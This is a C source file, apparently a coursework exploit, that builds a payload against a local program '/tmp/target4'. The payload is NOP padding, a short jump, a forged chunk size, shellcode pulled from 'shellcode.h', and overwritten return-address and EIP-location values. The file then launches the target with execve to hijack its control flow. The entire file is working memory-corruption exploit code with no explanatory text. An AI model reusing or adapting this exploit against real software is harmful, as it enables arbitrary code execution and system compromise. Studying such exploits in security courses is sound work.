#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target4"

#define BOUNDARY_OFFSET 500

static char payload[1024];

int main(void)
{
  char *args[3];
  char *env[1];

  const char *jmpahead = "\xeb\x0c";
  const char *size = "\xfd\xff\xff\xff";
  const int retaddr = 0x8049c68; // where noops start
  const int retloc = 0xbffffa3d; // eip location

  memset(payload, 0x90, 1024);
  memcpy(payload, jmpahead, 2);
  memcpy(payload + 4, size, 4);
  memcpy(payload + BOUNDARY_OFFSET - sizeof(shellcode), shellcode, sizeof(shellcode) - 1);
  *(int *)(payload + BOUNDARY_OFFSET + 4) = retaddr;
  *(int *)(payload + BOUNDARY_OFFSET + 8) = retloc;

  args[0] = TARGET; args[1] = payload; args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
